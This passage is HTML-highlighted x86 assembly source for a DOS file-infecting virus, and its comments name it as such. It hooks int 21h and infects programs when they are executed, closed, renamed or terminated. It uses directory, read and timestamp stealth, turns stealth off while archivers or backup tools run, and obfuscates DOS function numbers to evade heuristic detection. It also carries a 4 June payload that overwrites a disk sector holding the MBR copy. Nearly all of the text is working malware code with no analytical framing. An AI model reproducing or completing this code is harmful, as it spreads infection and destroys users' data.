                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">

                </span><span class="sc1">;Try to find original 21h tracing psp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc1">;Point ds:si to dispatch handler</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0006h</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">trace_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check if there is a jump instruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0EAh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">try_dispatcher</span><span class="sc0">

                </span><span class="sc1">;Check if there is a double-nop</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">9090h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">trace_loop</span><span class="sc0">

                </span><span class="sc1">;Sub offset from dispatcher</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">

                </span><span class="sc1">;Check if there is a double-nop</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_original</span><span class="sc0">

</span><span class="sc5">try_dispatcher</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Check for cs prefix and push ds</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">2E1Eh</span><span class="sc0">  
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_wait</span><span class="sc0">

                </span><span class="sc1">;Add offset from dispatcher</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0025h</span><span class="sc0">

                </span><span class="sc1">;Check for cli and push ax instructions</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">80FAh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_wait</span><span class="sc0">

</span><span class="sc5">found_original</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Save found address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">org21h_off</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">org21h_seg</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">exit_wait</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Restore regs and return</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Virus int 21h handler                                                     ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">my_int21h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Save entry regs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc1">;Get our code segment int ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc1">;Set int 21h running switch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">running_sw</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">

                </span><span class="sc1">;Anti-heuristic function number examination</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Get int 24h vector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">

                </span><span class="sc1">;Save old int 24h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old24h_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old24h_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc1">;Hook int 24h to a do-nothing handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_int24h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">

                </span><span class="sc1">;Check for special files</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0008h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">stealth_sw</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc1">;Check if arj is running</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"RA"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">disable_stealth</span><span class="sc0">

                </span><span class="sc1">;Check for pkzip utils        </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"KP"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">disable_stealth</span><span class="sc0">

                </span><span class="sc1">;Check for lha</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"HL"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">disable_stealth</span><span class="sc0">

                </span><span class="sc1">;Check for backup        </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"AB"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">disable_stealth</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_running</span><span class="sc0">

</span><span class="sc5">disable_stealth</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">stealth_sw</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc5">no_running</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Restore and re-save all regs        </span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
                </span><span class="sc1">;Put function number into bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Check for activation circunstances                                        ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">activation_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get dos date</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">2Ah</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">infection_00</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_get_date</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Infection functions                                                       ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">infection_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Exec function ( save filename for later infection )</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc2">4B00h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">infection_01</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_exec</span><span class="sc0">
</span><span class="sc5">infection_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Close file (Handle)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">3Eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">infection_02</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_close</span><span class="sc0">
</span><span class="sc5">infection_02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get or set file attribute</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">43h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">infection_03</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_file_ds_dx</span><span class="sc0">
</span><span class="sc5">infection_03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Rename or move file</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">56h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">infection_04</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_file_ds_dx</span><span class="sc0">
</span><span class="sc5">infection_04</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Terminate program ( infect executed program )</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">4Ch</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_dos</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_terminate_prog</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Stealth functions                                                         ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">stealth_dos</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check if stealth is disabled</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth_sw</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">

                </span><span class="sc1">;Open file (Handle)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">3Dh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_00</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_open</span><span class="sc0">
</span><span class="sc5">stealth_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Extended open</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">6Ch</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_01</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_open</span><span class="sc0">
</span><span class="sc5">stealth_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Directory stealth works with function Findfirst (fcb)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_02</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ff_fcb</span><span class="sc0">
</span><span class="sc5">stealth_02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Directory stealth works also with function Findnext(fcb)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_03</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ff_fcb</span><span class="sc0">
</span><span class="sc5">stealth_03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Search stealth works with Findfirst (handle)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">4Eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_04</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ff_handle</span><span class="sc0">
</span><span class="sc5">stealth_04</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Search stealth works also with Findnext (handle)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">4Fh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_05</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ff_handle</span><span class="sc0">
</span><span class="sc5">stealth_05</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Read stealth</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">3Fh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_06</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_read</span><span class="sc0">
</span><span class="sc5">stealth_06</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Disinfect if debuggers exec</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc2">4B01h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_07</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_load_exec</span><span class="sc0">
</span><span class="sc5">stealth_07</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Disinfect if file write</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,(</span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_08</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_write</span><span class="sc0">
</span><span class="sc5">stealth_08</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get file date/time        </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc2">5700h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stealth_09</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_get_time</span><span class="sc0">
</span><span class="sc5">stealth_09</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Set file date/time        </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc2">5701h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dos_set_time</span><span class="sc0">
</span><span class="sc5">m21h_exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Free int 24h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
                </span><span class="sc1">;Get control back to dos</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old21h</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Get dos date and payload                                                  ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">dos_get_date</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get regs values on function entry</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">

                </span><span class="sc1">;Call dos function</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">

                </span><span class="sc1">;Check if date is 4th of June</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0604h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">activate_now</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc5">activate_now</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Reset hd</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc1">;Overwrite mbr copy</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">                
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc1">;Set video-mode 80*25 16-Colors</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc1">;Set cursor position</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0B16h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc1">;Print string + beep</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
